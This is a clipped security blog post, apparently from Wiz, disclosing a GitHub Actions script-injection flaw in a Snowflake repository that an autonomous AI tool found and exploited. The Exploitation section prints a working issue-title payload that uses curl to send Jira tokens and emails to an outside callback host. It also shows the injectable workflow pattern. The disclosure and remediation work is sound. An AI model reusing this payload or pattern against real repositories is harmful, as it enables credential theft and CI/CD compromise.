---
title: "AI-Generated GitHub Copilot “Autofix” Allowed Compromise of Snowflake's Jira"
url: https://www.wiz.io/blog/red-agent-snowflake-copilot-cicd-bug
clipped: 2026-08-31 12:22:56
source: "HackerNews Digest"
tags:
  - hn-digest
  - clipping
---

# [AI-Generated GitHub Copilot “Autofix” Allowed Compromise of Snowflake's Jira](https://www.wiz.io/blog/red-agent-snowflake-copilot-cicd-bug)

## Digest Summary
Wiz Research’s autonomous AI tool, Red Agent, discovered a critical script‑injection flaw in Snowflake’s snowflake-connector-net GitHub repository (workflow jira_issue.yml). The vulnerability arose from a PR merged on 18 Jun 2026 (PR #1218, co‑authored by “Copilot Autofix”), which replaced a safe env + jq parsing pattern with direct interpolation of ${{ github.event.issue.title }} into a shell command. Because the workflow triggered on any issue opening, an attacker could craft an issue title that broke out of the escaped echo string and execute arbitrary commands in the GitHub Actions runner, exfiltrating Jira credentials via an out‑of‑band callback.  
Red Agent automatically refined its payload after an initial syntax error, successfully retrieving a base64‑encoded token and email associated with a Snowflake‑owned Jira account. Snowflake patched the workflow on the same day (23 Jun 2026, commit 1dc7766, PR #1402), revoked and rotated the token, and audit logs confirmed no external access beyond Wiz’s testing IPs.  
Key insights: AI‑generated code changes can unintentionally re‑introduce insecure patterns, demanding static‑analysis and guardrails; automated discovery can shorten exposure windows to days, requiring rapid patch cycles and short‑lived credentials.

---

## Full Article

[Wiz](https://www.wiz.io/)[Pricing](https://www.wiz.io/pricing?cta_source=blog&cta_page=/blog/red-agent-snowflake-copilot-cicd-bug&cta_placement=nav)[Get a demo](https://www.wiz.io/demo?cta_source=blog&cta_page=/blog/red-agent-snowflake-copilot-cicd-bug&cta_placement=nav)[Get a demo](https://www.wiz.io/demo?cta_source=blog&cta_page=/blog/red-agent-snowflake-copilot-cicd-bug&cta_placement=nav)

As part of ongoing security research conducted through Snowflake’s HackerOne vulnerability disclosure program, Wiz Research’s "Red Agent"—an autonomous, AI-powered security research tool—identified a critical GitHub Actions workflow vulnerability in one of Snowflake’s public repositories.

This incident highlights a new reality in software development: Critical vulnerabilities can still be introduced and approved within workflows involving AI coding agents and can still pass established automated security checks, while autonomous AI security agents can rapidly discover and exploit them in the wild.

Upon responsible disclosure on June 23, 2026 by Wiz, Snowflake remediated the vulnerability on the same day, rotated the affected credential, and verified via detailed audit logs that Wiz was the sole actor during the exposure window. Wiz confirmed that all data accessed during proof-of-concept testing was securely deleted.

August 17, 2026, 1957 UTC update: This blog has been updated to clarify that Copilot was a co-author that checked the merged PR and code change, and identified it as all-clear without noticing the critical vulnerabilities. It's unclear whether the code-change was AI-assisted.

# Executive Summary

Wiz Red Agent identified a script injection vulnerability in [snowflakedb/snowflake-connector-net](https://github.com/snowflakedb/snowflake-connector-net). The issue allowed an unauthenticated user to execute arbitrary commands within a GitHub Actions runner by opening a GitHub issue with a specially crafted title.Crucially, the vulnerability became live on June 18, 2026 - just five days before its discovery - when [PR #1218](https://github.com/snowflakedb/snowflake-connector-net/pull/1218) was merged. GitHub Advanced Security scan analyzed the final PR revision, including the vulnerable workflow, but did not flag the critical injection.

Screenshot demonstrating access to Snowflake's Jira portal, via an exfiltrated token

# Exposure Walk-Through

## Discovery

Wiz Red Agent's CI/CD capability scanned Snowflake's GitHub organization and flagged the  `` [jira_issue.yml](https://github.com/snowflakedb/snowflake-connector-net/blob/4a1b8cecd65b899540e4324715557d6b080ddeb5/.github/workflows/jira_issue.yml) Workflow in  `` [snowflakedb/snowflake-connector-net](https://github.com/snowflakedb/snowflake-connector-net) as vulnerable to script injection via untrusted input in  `run:`  blocks. 

The Code Change ` `- env:
  - ISSUE_TITLE: ${{ github.event.issue.title }}
- run: jq -n --arg title "$ISSUE_TITLE" ...
+ run: TITLE=$(echo '${{ github.event.issue.title }}' | sed ...)` ` 

The workflow triggered on  `issues: opened`  - meaning any GitHub user could fire it by opening an issue - and interpolated the attacker-controlled issue title directly into a shell script: ` `run: | TITLE=$(echo '${{ github.event.issue.title }}' | sed 's/"/\\"/g' | sed "s/'/\\\'/g") ` ` 

The  `sed`  escaping runs after GitHub's template expansion, a single quote in the title breaks out of  `echo '...'`  and allows arbitrary command execution.The injectable pattern was added to jira_issue.yml in commit 094038e and became live when PR #1218 was squash-merged as [commit 4a1b8ce](https://github.com/snowflakedb/snowflake-connector-net/commit/4a1b8cecd65b899540e4324715557d6b080ddeb5) ([PR #1218: “SNOW-2069227: Update jira workflows”](https://github.com/snowflakedb/snowflake-connector-net/commit/4a1b8cecd65b899540e4324715557d6b080ddeb5)). Copilot Autofix’s documented contribution was a separate fix to jira_close.yml within the same PR. GitHub Advanced Security’s scan explicitly extracted the vulnerable jira_issue.yml workflow but did not flag the injection. The merged PR removed the repository’s existing safe env: and jq pattern and replaced it with direct ${{ github.event.issue.title }} interpolation, creating the injection vector.The commit introducing the vulnerable patternThe code change introducing the vulnerable pattern

## The Open “Security Gate”

The workflow had an  `if:`  condition that appeared protective: ` `if: (github.event_name == 'issues' && github.event.pull_request.user.login != 'whitesource-for-github-com[bot]')` ` 

However, on issues events,  `github.event.pull_request`  is always null. 

So the condition reduces to ( `null != 'whitesource-for-github-com[bot]'` ). This is always true, and every GitHub user passes the gate.The Open “Security Gate”

# Exploitation

We crafted an issue title that, after template expansion, breaks out of the echo string and exfiltrates the Jira credentials via an out-of-band callback:

Crucially, when Red Agent’s cicd capability initially attempted exfiltration using a standard comment character ( `#` ), the runner returned a bash syntax error because the comment consumed the closing parenthetical of  `TITLE=$(...)` . Rather than stopping or failing, Red Agent:
- 

autonomously analyzed the syntax execution error
- 

adjusted its payload to use  `; echo '`  to properly close the shell block, and 
- 

successfully received the out-of-band callback ` `' ; curl -s "https://subdomain.oast.me?t=`printf %s $JIRA_API_TOKEN|base64 -w0`&e=`printf %s $JIRA_USER_EMAIL|base64 -w0`&u=`printf %s $JIRA_BASE_URL|base64 -w0`" ; echo '` ` 

Within seconds, our listener received the callback from a GitHub Actions runner (Azure IP  `20.106.182.197` ) containing base64-encoded credentials.The POC PR with payload in the Issue title

Note: Our first attempt used  `#`  to comment out the rest of the line, which caused an unexpected EOF bash error because it also ate the closing  `)`  of  `TITLE=$(...)` . The fix was using  `; echo '`  to properly close the shell syntax.The workflow log showing successful exploitationThe exfiltrated token linked to qa@snowflake.net

The exfiltrated token authenticated as  `qa@snowflake.net`  to  `snowflakecomputing.atlassian.net` , granting read access across Snowflake's engineering, security compliance, and bug bounty tracking projects.

# Remediation & Forensics

- 

Same-Day Patching: Snowflake patched the workflow on June 23, 2026 ([1dc7766](https://github.com/snowflakedb/snowflake-connector-net/commit/1dc7766), PR #1402), fully restoring the safe  `env:`  variable and  `jq --arg`  parsing pattern.
- 

Credential Revocation: The JIRA token in question was revoked and rotated.
- 

Forensic Verification: Comprehensive audit log analysis confirmed that no external third parties accessed the endpoint during the 5-day exposure window. All anomalous queries were strictly matched to Wiz's testing IPs.

# Key Takeaways

- 

AI Code Generation Demands Rigorous Oversight: AI coding tools predict code based on probabilistic patterns, which can inadvertently reintroduce deprecated or insecure shell patterns. AI-generated PRs must undergo the same static analysis and security scrutiny as human code.
- 

Collapsing Discovery Windows: The vulnerability was live for only five days before an automated agent discovered and validated it. Security operations must adapt to a landscape where automated discovery occurs in hours, requiring rapid patch cycles and short-lived credentials.
- 

Preventing CI/CD Security Regressions: Security intent can be lost when safer code patterns are not explicitly enforced. In this incident, the merged PR removed a safe env: + jq parsing pattern and replaced it with direct string interpolation, while the existing security solution failed to flag the resulting injection that led to the exposure.

## Disclosure Timeline 

- 

June 18, 2026 - The vulnerability became live when PR #1218 was merged.
- 

June 23, 2026 - Wiz identified, exploited, and reported vulnerability to Snowflake via HackerOne (report #3819931)
- 

June 23, 2026 - Slack notification sent to Snowflake security team
- 

June 23, 2026 (same day) - Snowflake patches the vulnerable script-injection workflow ([commit 1dc7766](https://github.com/snowflakedb/snowflake-connector-net/commit/1dc7766), [PR #1402](https://github.com/snowflakedb/snowflake-connector-net/pull/1402)), restoring the safe  `env:`  +  `jq --arg`  pattern. 
- 

June 24, 2026 - Jira token rotated
- 

July 25, 2026 - Public disclosure deadline (30 days after the June 25 resolution, per Snowflake’s disclosure policy)

# Snowflake’s Response

Snowflake appreciates Wiz's responsible reporting of and collaboration around these findings through our vulnerability disclosure and bug bounty program, HackerOne. Wiz Research reported a security vulnerability in one of Snowflake's public GitHub repositories. The disclosure was received on June 23, 2026, and it was immediately investigated and remediated, and our investigation found no evidence of unauthorized access. Protecting our systems remains a top priority, and we remain committed to continually strengthening our software development and security practices. We are working together with Wiz to share these learnings with the broader industry to encourage widespread adoption of these security best practices.Tags[#Research](https://www.wiz.io/blog/tag/research)[#AI](https://www.wiz.io/blog/tag/ai)[#Wiz Agents](https://www.wiz.io/blog/tag/wiz-agents)

## Continue reading

### 

[The Closed Loop Remediation Playbook with Wiz](https://www.wiz.io/blog/wiz-remediation-playbook)+3[Eyal Golombek](https://www.wiz.io/authors/eyal-golombek), [Guy Mast](https://www.wiz.io/authors/guy-mast), [Erez Talgam](https://www.wiz.io/authors/erez-talgam) and 3 moreAugust 17, 2026

Start your path to a self-healing cloud today, with Wiz Workflows now GA and Remediation and Response in public preview.

### 

[Wiz on Wiz: How the Wiz FinOps Team Uses Wiz Cloud Cost](https://www.wiz.io/blog/how-wiz-finops-uses-wiz-cloud-cost)+2[Ron Tzrouya](https://www.wiz.io/authors/ron-tzrouya), [Guy Aharon](https://www.wiz.io/authors/guy-aharon), [Noa Manor](https://www.wiz.io/authors/noa-manor) and 2 moreAugust 14, 2026

Powering cost investigation and optimization with deep cloud context

### 

[Securing Data in the AI era](https://www.wiz.io/blog/securing-data-in-the-ai-era)[Snegha Ramnarayanan](https://www.wiz.io/authors/snegha), [Shachar Horvitz](https://www.wiz.io/authors/shachar-horvitz), [Noa Azaria](https://www.wiz.io/authors/noa-azaria), [Chad Knipschild](https://www.wiz.io/authors/chad-knipschild)August 14, 2026

AI is changing the context around data risk, making it critical to understand what’s connected, what’s exposed, and why.

Get a personalized demo

## Ready to see Wiz in action?

"Best User Experience I have ever seen, provides full visibility to cloud workloads."David EstlickCISO"Wiz provides a single pane of glass to see what is going on in our cloud environments."Adam FletcherChief Security Officer"We know that if Wiz identifies something as critical, it actually is."Greg PoniatowskiHead of Threat and Vulnerability Management[Get a demo](https://www.wiz.io/demo)English (US)
